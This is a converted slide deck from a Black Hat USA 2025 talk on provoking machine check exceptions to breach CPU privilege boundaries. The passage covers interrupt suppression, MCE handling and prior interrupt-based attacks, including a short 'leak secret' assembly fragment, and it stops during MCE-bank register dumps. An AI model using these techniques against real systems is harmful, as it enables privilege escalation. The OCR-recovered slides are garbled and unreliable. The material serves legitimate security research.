---
title: "Ghosts in the Machine Check - Conjuring Hardware Failures to Breach CPU Privilege Boundaries"
speakers: ["Christopher Domas"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Christopher Domas_Ghosts in the Machine Check - Conjuring Hardware Failures to Breach CPU Privilege Boundaries.pdf"
pages: 261
sha256: "b32eb505235b0429ace3e6b7a6e892567a7c57adce7c24e967ae11c91872fafc"
text_chars: 213366
ocr_pages: 25
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:54:11Z"
---
# Ghosts in the Machine Check - Conjuring Hardware Failures to Breach CPU Privilege Boundaries

**Speakers:** Christopher Domas  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Christopher Domas_Ghosts in the Machine Check - Conjuring Hardware Failures to Breach CPU Privilege Boundaries.pdf` (261 pages)


## Slide 1

ghosts in the machine check domas / @xoreaxeaxeax / Black Hat 2025 ｛

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
.
ghosts In the machine check
{ domas / @xoreaxeaxeax / Black Hat 2025
S.
*
aaa Aa °
= ° «
```

## Slide 2

(demo)

## Slide 3

## Slide 4

⊷Interrupts and Exceptions

state disruption

## Slide 5

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); …

CPU

## Slide 6

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); … CPU

PCIe

## Slide 7

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); … CPU PCIe MSI

## Slide 8

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); … ! interrupt CPU

PCIe
MSI

static irqreturn_t dpc_irq(int irq, void *context) { struct pci_dev *pdev = context; u16 cap = pdev->dpc_cap, status; pci_read_config_word(pdev, cap + …, &status); … pci_write_config_word(pdev, cap + …, …);

… return IRQ_HANDLED; }

## Slide 9

PCIe
MSI

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); … ! interrupt CPU static irqreturn_t dpc_irq(int irq, void *context) { struct pci_dev *pdev = context; u16 cap = pdev->dpc_cap, status; pci_read_config_word(pdev, cap + …, &status); … pci_write_config_word(pdev, cap + …, …); … return IRQ_HANDLED; }

## Slide 10

PCIe
MSI

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); … ! interrupt CPU static irqreturn_t dpc_irq(int irq, void *context) { struct pci_dev *pdev = context; u16 cap = pdev->dpc_cap, status; pci_read_config_word(pdev, cap + …, &status); … pci_write_config_word(pdev, cap + …, …);

… return IRQ_HANDLED; }

## Slide 11

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); … CPU

static irqreturn_t dpc_irq(int irq, void *context) { struct pci_dev *pdev = context; u16 cap = pdev->dpc_cap, status; pci_read_config_word(pdev, cap + …, &status); … pci_write_config_word(pdev, cap + …, …); … return IRQ_HANDLED; }

## Slide 12

⊷Interrupts and Exceptions

⊸ Trigger a handler

⊸ Handler must save/restore system state

⊶ Not always easy / practical / possible

state disruption

## Slide 13

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); rtc_tm->tm_sec = CMOS_READ(RTC_SECONDS); rtc_tm->tm_min = CMOS_READ(RTC_MINUTES); rtc_tm->tm_hour = CMOS_READ(RTC_HOURS); rtc_tm->tm_mday = CMOS_READ(RTC_DAY_OF_MONTH); rtc_tm->tm_mon = CMOS_READ(RTC_MONTH); rtc_tm->tm_year = CMOS_READ(RTC_YEAR); rtc_tm->tm_wday = CMOS_READ(RTC_DAY_OF_WEEK); ctrl = CMOS_READ(RTC_CONTROL); ... }

## Slide 14

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); rtc_tm->tm_sec = CMOS_READ(RTC_SECONDS); rtc_tm->tm_min = CMOS_READ(RTC_MINUTES); rtc_tm->tm_hour = CMOS_READ(RTC_HOURS); rtc_tm->tm_mday = CMOS_READ(RTC_DAY_OF_MONTH); rtc_tm->tm_mon = CMOS_READ(RTC_MONTH); rtc_tm->tm_year = CMOS_READ(RTC_YEAR); rtc_tm->tm_wday = CMOS_READ(RTC_DAY_OF_WEEK); ctrl = CMOS_READ(RTC_CONTROL);

outb(RTC_SECONDS, RTC_PORT(0)); val = inb(RTC_PORT(1));

... }

## Slide 15

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); outb(RTC_SECONDS, RTC_PORT(0)); rtc_tm->tm_sec = CMOS_READ(RTC_SECONDS); val = inb(RTC_PORT(1)); rtc_tm->tm_min = CMOS_READ(RTC_MINUTES); rtc_tm->tm_hour = CMOS_READ(RTC_HOURS); rtc_tm->tm_mday = CMOS_READ(RTC_DAY_OF_MONTH); rtc_tm->tm_mon = CMOS_READ(RTC_MONTH); rtc_tm->tm_year = CMOS_READ(RTC_YEAR); rtc_tm->tm_wday = CMOS_READ(RTC_DAY_OF_WEEK); static irqreturn_t rtc_interrupt(int irq, void *dev_id) { ctrl = CMOS_READ(RTC_CONTROL); … ... outb(RTC_YEAR, RTC_PORT(0)); } … }

## Slide 16

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) {

unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax();

rtc_tm->tm_sec = CMOS_READ(RTC_SECONDS); rtc_tm->tm_min = CMOS_READ(RTC_MINUTES); rtc_tm->tm_hour = CMOS_READ(RTC_HOURS); rtc_tm->tm_mday = CMOS_READ(RTC_DAY_OF_MONTH); rtc_tm->tm_mon = CMOS_READ(RTC_MONTH); rtc_tm->tm_year = CMOS_READ(RTC_YEAR); rtc_tm->tm_wday = CMOS_READ(RTC_DAY_OF_WEEK);

ctrl = CMOS_READ(RTC_CONTROL);

... }

outb(RTC_SECONDS, RTC_PORT(0)); val = inb(RTC_PORT(1));

static irqreturn_t rtc_interrupt(int irq, void *dev_id) { … outb(RTC_YEAR, RTC_PORT(0)); … }

## Slide 17

⊷Some things shouldn’t be interrupted

- ⊸ Privilege and mode transitions

- ⊸ Secure environments

- ⊸ Interrupt handlers, page-table updates, critical sections, etc.

⊷Solution: interrupt suppression

- ⊸ Keep interrupts pending temporarily, then service in new environment

state disruption

## Slide 18

static void rtc_get_rtc_time(struct rtc_time *rtc_tm) { unsigned long uip_watchdog = jiffies, flags; unsigned char ctrl; while (rtc_is_updating() != 0 && time_before(jiffies, uip_watchdog + 2*HZ/100)) cpu_relax(); spin_lock_irqsave(&rtc_lock, flags); rtc_tm->tm_sec = CMOS_READ(RTC_SECONDS); rtc_tm->tm_min = CMOS_READ(RTC_MINUTES); rtc_tm->tm_hour = CMOS_READ(RTC_HOURS); rtc_tm->tm_mday = CMOS_READ(RTC_DAY_OF_MONTH); rtc_tm->tm_mon = CMOS_READ(RTC_MONTH); rtc_tm->tm_year = CMOS_READ(RTC_YEAR); rtc_tm->tm_wday = CMOS_READ(RTC_DAY_OF_WEEK); ctrl = CMOS_READ(RTC_CONTROL); spin_unlock_irqrestore(&rtc_lock, flags); ... }

## Slide 19

⊷Transition code / secure environments must carefully accommodate unsuppressed interrupts/exceptions ⊷As long as everything is written perfectly, all the time, for every fringe case, there are no issues

state disruption

## Slide 20

⊷Difficulties arise

state disruption

## Slide 21

##### ⊷ Wojtczuk (2012) – (userland to kernel) Interrupts/exceptions in syscall handler on untrusted stack

diff -r 340062faf298 -r ad87903fdca1 xen/arch/x86/x86_64/entry.S --- a/xen/arch/x86/x86_64/entry.S Wed May 23 11:06:49 2012 +0100 +++ b/xen/arch/x86/x86_64/entry.S Thu May 24 11:02:35 2012 +0100 @@ -40,6 +40,13 @@ restore_all_guest: testw $TRAP_syscall,4(%rsp) jz    iret_exit_to_guest +        /* Don't use SYSRET path if the return address is not canonical. */ +        movq  8(%rsp),%rcx +        sarq  $47,%rcx +        incl  %ecx +        cmpl  $1,%ecx +        ja    .Lforce_iret + addq  $8,%rsp popq  %rcx                    # RIP popq  %r11                    # CS @@ -50,6 +57,10 @@ restore_all_guest: sysretq 1:      sysretl +.Lforce_iret: +        /* Mimic SYSRET behavior. */ +        movq  8(%rsp),%rcx            # RIP +        movq  24(%rsp),%r11           # RFLAGS ALIGN /* No special register assumptions. */ iret_exit_to_guest:

source:https://media.blackhat.com/bh-us-12/Briefings/Wojtczuk/BH_US_12_Wojtczuk_A_Stitch_In_Time_WP.pdf source:https://lists.xen.org/archives/html/xen-announce/2012-06/msg00001.html

## Slide 22

##### ⊷ Peterson/Mulasmajic (2018) –  (userland to kernel) pop ss/mov ss Vulnerability

KiBreakpointTrap proc sub rsp, 8 push rbp sub rsp, 158h lea rbp, [rsp+80h] mov [rbp+TrapInfo.ExceptionActive], 1 mov [rbp+TrapInfo._Rax], rax mov [rbp+TrapInfo._Rcx], rcx mov [rbp+TrapInfo._Rdx], rdx mov [rbp+TrapInfo._R8], r8 mov [rbp+TrapInfo._R9], r9 mov [rbp+TrapInfo._R10], r10 mov [rbp+TrapInfo._R11], r11 test byte ptr [rbp+TrapInfo.SegCs], 1 jz short ExecutingInKernelModeContext swapgs mov r10, gs:_KPCR.Prcb.CurrentThread test [r10+_KTHREAD.Header.DebugActive], 80h jz short DebugIsActive mov ecx, 0C0000102h rdmsr

source:https://i.blackhat.com/us-18/Wed-August-8/us-18-Mulasmajic-Peterson-Why-So-Spurious-wp.pdf

## Slide 23

⊷GPZ (2023) –  (hypervisor to TEE) Induce exception to compromise TDX SEAMLDR

lgdt FWORD PTR [rcx].SEAMLDR_COM64_DATA.OriginalGdtr mov rbx, QWORD PTR [rcx].SEAMLDR_COM64_DATA.ResumeRip mov r8, QWORD PTR [rcx].SEAMLDR_COM64_DATA.OriginalCR3 mov r9, QWORD PTR [rcx].SEAMLDR_COM64_DATA.RetVal mov rdx, 0 mov rax, EXITAC push 2 popfq mov rcx, 0

… GETSEC[EXITAC]

source:https://services.google.com/fh/files/misc/intel_tdx_-_full_report_041423.pdf

## Slide 24

⊷Schluter et al. (2024) – (hypervisor to TEE) Inject malicious interrupts to break confidential VMs %% Example: Leak secret mov eax , 4 % write syscall number mov ebx ... % move shared memory fd mov ecx, [ebp - 4] % buf mov edx, 8 % count ... ; << malicious interrupt injection from hypervisor

source:https://www.usenix.org/system/files/usenixsecurity24-schluter.pdf

## Slide 25

⊷Interrupts are a sort of state disruptor

state disruption

## Slide 26

⊷Solution: heavy interrupt suppression

⊸ Software

⊶ Interrupt flag (e.g. “cli”) ⊶ Task priority register ⊸ Microcode

⊶ Clear interrupt flag on entry to ISR

- ⊶ Mask NMI until “iret” to prevent nested NMIs ⊶ INIT/SIPI

⊶ Enclaves

⊸ Hardware

- ⊶ Mask interrupt lines at Programmable Interrupt Controller ⊶ C-states

⊶ Disable generation from various peripherals ⊸ e.g. clear IF, clear TF, clear DR7, latch NMI, latch SMI, mask INIT, clear DEBUGCTL, etc.

state disruption

## Slide 27

⊷Can we break through this?

state disruption

## Slide 28

⊷One interrupt that generally cannot be delayed, suppressed, latched, etc.: the Machine Check Exception (MCE)

state disruption

## Slide 29

⊷Unpredictable hardware failures

- ⊸ Memory corruptions

- ⊸ Cache errors

- ⊸ TLB failures

- ⊸ etc.

⊷Caused by aging devices, thermal limits, signal integrity, static electricity, heat, high energy particles, etc. ⊷CPU detects and generates #MC exception ⊷#MC transfers control to 18<sup>th</sup> interrupt handler in Interrupt Descriptor Table (IDT), installed by OS

machine check exceptions

## Slide 30

CPU

machine check exceptions

## Slide 31

CPU

machine check exceptions

## Slide 32

CPU

machine check exceptions

## Slide 33

_“_ The CATERR# indicates that the system has experienced a catastrophic error and cannot continue to operate _”_

CATERR# CPU

machine check exceptions

## Slide 34

MC#
IDT
…
ffffffffc0b2ed40
CATERR#
CPU ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
ffffffffc0b2ee80
…

machine check exceptions

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MC#
IDT
ffttffftcObeed40
CATERR#
<— CPU ffttffttcObeed8O0
ONS
Jel ffftffffcObeedcO
nS éfftFftfCOb2ee40
ffffffftcObeee8O
machine check exceptions
```

## Slide 35

MC#
IDT
…
ffffffffc0b2ed40
CATERR#
CPU 18 th  vector ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
ffffffffc0b2ee80
…

machine check exceptions

## Slide 36

push   %rax
push   %rdi
MC#
push   %rsi
IDT
push   %rdx
push   %rcx
… push   %r8
push   %r9
push   %r10
ffffffffc0b2ed40
push   %r11
THERMTRIP# mov    $0x3,%rdi
CPU 18 th  vector ffffffffc0b2ed80 mov    $0xfe,%rsi
mov    0x48(%rsp),%rdx
ffffffffc0b2edc0 mov    0x50(%rsp),%r10
callq  1180 <mce_handler>
pop    %r11
ffffffffc0b2ee40
pop    %r10
pop    %r9
ffffffffc0b2ee80 pop    %r8
pop    %rcx
pop    %rdx
…
pop    %rsi
pop    %rdi
pop    %rax
iretq
machine check exceptions

## Slide 37

CPU

PCIe

machine check exceptions

## Slide 38

CPU

PCIe

machine check exceptions

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Oo
, CPU
Sel
PCle
machine check exceptions
```

## Slide 39

CPU
PCIe
SERR#

machine check exceptions

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
O
, CPU
OS
Jest |
PCle
SERR#
machine check exceptions
```

## Slide 40

“ The CATERR# indicates that the system
has experienced a catastrophic error
and cannot continue to operate ”
CATERR#
CPU
PCIe
SERR#

machine check exceptions

## Slide 41

MC#
IDT
…
ffffffffc0b2ed40
CATERR#
CPU ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
ffffffffc0b2ee80
PCIe
SERR#
…
machine check exceptions

## Slide 42

MC#
IDT
…
ffffffffc0b2ed40
CATERR#
CPU 18 th  vector ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
ffffffffc0b2ee80
PCIe
SERR#
…
machine check exceptions

## Slide 43

push   %rax
push   %rdi
MC#
push   %rsi
IDT
push   %rdx
push   %rcx
… push   %r8
push   %r9
push   %r10
ffffffffc0b2ed40
push   %r11
CATERR# mov    $0x3,%rdi
CPU 18 th  vector ffffffffc0b2ed80 mov    $0xfe,%rsi
mov    0x48(%rsp),%rdx
ffffffffc0b2edc0 mov    0x50(%rsp),%r10
callq  1180 <mce_handler>
pop    %r11
ffffffffc0b2ee40
pop    %r10
pop    %r9
ffffffffc0b2ee80 pop    %r8
PCIe
pop    %rcx
SERR#
pop    %rdx
…
pop    %rsi
pop    %rdi
pop    %rax
iretq
machine check exceptions

## Slide 44

⊷Hardware failure happened ⊷Machine check generated by CPU ⊷OS has control ⊷What should handler do?

machine check exceptions

## Slide 45

"MCE can be delivered at any time”

## Slide 46

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts ” are disabled.

"MCE can be delivered at any time”

## Slide 47

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts are disabled.”

Default return value: Action required, the error must be handled immediately.

"MCE can be delivered at any time”

## Slide 48

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts are disabled.”

Default return value: Action required, the error must be handled immediately.

"It is also important to handle the machine check quickly (because the machine may be already unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event cannot be handled at all."

"MCE can be delivered at any time”

## Slide 49

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts are disabled.”

"An uncorrectable error will cause a machine panic"

Default return value: Action required, the error must be handled immediately.

"It is also important to handle the machine check quickly (because the machine may be already unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event cannot be handled at all."

"MCE can be delivered at any time”

## Slide 50

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts are disabled.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

"By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…" "It is also important to handle the machine check quickly (because the machine may be already unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

"MCE can be delivered at any time”

## Slide 51

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts

are disabled.”

“It is a bad idea to continue when an uncorrectable error occurs – it is indeterminate what was uncorrected and the operating system context might be so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

"By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

"It is also important to handle the machine check quickly (because the machine may be already unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 52

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

"By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

"It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 53

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

“no idea what we were executing when the machine check hit.” "By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

"It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 54

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

“no idea what we were executing when the machine check hit.” "By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

no chance to recover -> PANIC

"It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 55

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

“no idea what we were executing when the machine check hit.” "By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

no chance to recover -> PANIC /* Must die if the interrupt is not recoverable */ "It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 56

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.” Processor Context Corrupt, no need to fumble too much, die! "An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

“no idea what we were executing when the machine check hit.” "By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

no chance to recover -> PANIC /* Must die if the interrupt is not recoverable */ "It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 57

⊷MCE handler

⊸ Determine source of error ⊸ Print a message if possible ⊸ Shut down before things get worse

machine check exceptions

* even more complex with advent of RAS and correctable errors

## Slide 58

## ⊷MCEs are unique ⊸ Demand immediacy

- ⊸ Represent an unexpected, critical hardware failure

- ⊸ Cannot be masked, delayed, deprioritized, or preempted

machine check exceptions

## Slide 59

⊷Single way to avoid handling MCEs

⊸ Disable in CR4 register

- ⊸ If MCE is received while disabled in CR4, CPU resets

⊷CPU options are:

- ⊸ Handling MCEs immediately

- ⊸ Or be reset when one is received

machine check exceptions

## Slide 60

⊷Solution: heavy interrupt suppression ⊷MCEs hit the CPU unexpectedly, break through all other interrupt defenses

machine check exceptions

## Slide 61

Let’s build a hammer…

## Slide 62

⊷Challenge ⊸ MCEs are exceedingly rare, sporadic, unpredictable hardware failures

generating MCEs

## Slide 63

(demo)

generating MCEs

## Slide 64

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Every @.1s: cat /proc/interrupts
MIS:
PIN:
NPI:
PIW:
CPU@
48
1
ol
eSefpoooononoqnonooqnooqnooqnooqnonoooods
18
1328403
@
18
1167887
)
6574
228571
282
CPUL
Q
Uy)
>
a
as
i)
i
b
Neooonoconoooooqnonoodos
524713
a
16
597638
Q
6263
472783
361
eoo
| grep --color=always -e "“" -e "MCE.*" ubuntu-usb-3: Sat Aug 2 21:03:46 2025
cPU2
Q
a
a
Q
a
a
a
Q
a
a
1365
31
a
HAoooosds
10
484269
a
10
473827
a
6254
380810
370
eoo
CPU3
a
a
a
)
536049
eooooo0nonononoo
b
>
S
oa
Oo
eoo
)
12
884136
a
12
553122
a
5074
324352
345
eoo
I0-APIC 2-edge timer
I0-APIC 8-edge rtcd
I0-APIC 9-fasteoi acpi
IO-APIC 16-fasteoi snd_hda_intel:card1
IO-APIC 18-fasteoi ehci_hcd:usb1, ehci_hcd:usb2
PCI-MSI 34816-edge PCIe PME, pciehp
PCI-MSI 36864-edge PCIe PME, pciehp
PCI-MSI 38912-edge PCIe PME, pciehp
PCI-MSI 40960-edge PCIe PME, pciehp
PCI-MSI 43008-edge PCIe PME, pciehp
PCI-MSI 278528-edge ahcil0000:00:11.0]
PCI-MSI 262144-edge xhei_hed
PCI-MSI 262145-edge xhci_hed
PCI-MSI 262146-edge xhci_hed
PCI-MSI 262147-edge xhei_hed
PCI-MSI 262148-edge xhei_hed
PCI-MSI 2097152-edge enp4s0
PCI-MSI 131073-edge cecp-1
PCI-MSI 18432-edge snd_hda_intel:card@
PCI-MSI 16384-edge radeon
Non-maskable interrupts
Local timer interrupts
Spurious interrupts
Performance monitoring interrupts
IRQ work interrupts
APIC ICR read retries
Rescheduling interrupts
Function call interrupts
TLB shootdowns
Thermal event interrupts
Threshold APIC interrupts
Deferred Error APIC interrupts
Machine check exceptions
Machine check polls
Posted-interrupt notification event
Nested posted-interrupt event
Posted-interrupt wakeup event
```

## Slide 65

⊷Could we generate these on-demand? ⊸ Simulations won’t work, need real, physical MCEs

generating MCEs

## Slide 66

- ⊷Machine check registers arranged in banks ⊷Different banks devoted to different sources

⊸ Changes across generations ⊸ LS, IF, L2, DE, EX, FP, L3, CS, PIE, UMC, PB, PSP, SMU, MP5, NBIO, PCIE, etc. ⊷Many, many options for MCE sources

generating MCEs

## Slide 67

||--- global ---
6   5   5   4   4   4   3   3|2   2   2   1   1   0   0   0||
|---|---|---|---|
||0   6   2   8   4   0   6   2|8   4   0   6   2   8   4   0||
||mcg_cap (00000179):
mcg_stat (0000017a):
mcg_ctl (0000017b):|x     xx  (
(
xx xxx (|106)
0)
37)|
|--- MC0 (load-store) ---
||--- MC3 (reserved) ---
||
|6   5   5|4   4   4   3   3   2   2   2   1   1   0   0   0||5   5   4   4   4   3   3   2   2   2   1   1   0   0   0|
|0   6   2
mc0_ctl (00000400):
|8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxx xx   (             fec)
|
mc3_ctl (0000040c):
|0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
|
|mc0_status (00000401):
mc0_addr (00000402):|(               0)
(               0)|mc3_status (0000040d):
mc3_addr (0000040e):|(               0)
(               0)|
|mc0_misc (00000403):
mc0_mask (c0010044):|(               0)
(               0)|mc3_misc (0000040f):
mc3_mask (c0010047):|(               0)
(               0)|
|--- MC1 (instruction-fetch) ---
6   5   5|4   4   4   3   3   2   2   2   1   1   0   0   0|--- MC4 (northbridge) ---
|6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0|
|0   6   2
|8   4   0   6   2   8   4   0   6   2   8   4   0
|
|0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
|
|mc1_ctl (00000404):|x  x xxxxx (             25f)|mc4_ctl (00000410):|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (        ffffffff)|
|mc1_status (00000405):
|(               0)
|mc4_status (00000411):
|(               0)
|
|mc1_addr (00000406):|(               0)|mc4_addr (00000412):|(               0)|
|mc1_misc (00000407):
|(               0)
|mc4_misc0 (00000413): xx
|xx x                        x                         (c01a000001000000)
|
|mc1_mask (c0010045):|(               0)|mc4_misc1 (c0000408):
mc4_misc2 (c0000409):
|x                           x                         (  10000001000000)
(               0)
|
|||mc4_mask (c0010048):|x                           (         4000000)|
|--- MC2 (combined-unit) ---
||--- MC5 (execution-unit) ---
||
|6   5   5|4   4   4   3   3   2   2   2   1   1   0   0   0||5   5   4   4   4   3   3   2   2   2   1   1   0   0   0|
|0   6   2
|8   4   0   6   2   8   4   0   6   2   8   4   0
|
|0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
|
|mc2_ctl (00000408):
|x    xxxxx xx  (            21f6)
|mc5_ctl (00000414):
|x (               1)
|
|mc2_status (00000409):|(               0)|mc5_status (00000415):|(               0)|
|mc2_addr (0000040a):
|(               0)
|mc5_addr (00000416):
|(               0)
|
|mc2_misc (0000040b):|(               0)|mc5_misc (00000417):|(               0)|
|mc2_mask (c0010046):|(               0)|mc5_mask (c0010049):|(               0)|

## Slide 68

|--- extended bank 0 ---
6
0
ctl (c0002000):
status (c0002001):
addr (c0002002):
misc0 (c0002003): xx x
config (c0002004):
ipid (c0002005):
synd (c0002006):
reserved (c0002007):
destat (c0002008):
deaddr (c0002009):
misc1 (c000200a):
misc2 (c000200b):
misc3 (c000200c):
misc4 (c000200d):
reserved (c000200e):
reserved (c000200f):
mask (c0010400):
--- extended bank 1 ---
6
0
ctl (c0002010):
status (c0002011):
addr (c0002012):
misc0 (c0002013): xx x
config (c0002014):
ipid (c0002015):
synd (c0002016):
reserved (c0002017):
destat (c0002018):
deaddr (c0002019):
misc1 (c000201a):
misc2 (c000201b):
misc3 (c000201c):
misc4 (c000201d):
reserved (c000201e):
reserved (c000201f):
mask (c0010401):
--- extended bank 2 ---
6
0
ctl (c0002020):
status (c0002021):
addr (c0002022):
misc0 (c0002023): xx x
config (c0002024):
ipid (c0002025):
synd (c0002026):
reserved (c0002027):
destat (c0002028):
deaddr (c0002029):
misc1 (c000202a):
misc2 (c000202b):
misc3 (c000202c):
misc4 (c000202d):
reserved (c000202e):
reserved (c000202f):
mask (c0010402):
--- extended bank 3 ---
6
0
ctl (c0002030):
status (c0002031):
addr (c0002032):
misc0 (c0002033): xx x
config (c0002034):
ipid (c0002035):
synd (c0002036):
reserved (c0002037):
destat (c0002038):
deaddr (c0002039):
misc1 (c000203a):
misc2 (c000203b):
misc3 (c000203c):
misc4 (c000203d):
reserved (c000203e):
reserved (c000203f):
mask (c0010403):
--- extended bank 4 ---
6
0
ctl (c0002040):
status (c0002041):
addr (c0002042):
misc0 (c0002043):
config (c0002044):
ipid (c0002045):
synd (c0002046):
reserved (c0002047):
destat (c0002048):
deaddr (c0002049):
misc1 (c000204a):
misc2 (c000204b):
misc3 (c000204c):
misc4 (c000204d):
reserved (c000204e):
reserved (c000204f):
mask (c0010404):
--- extended bank 5 ---
6
0
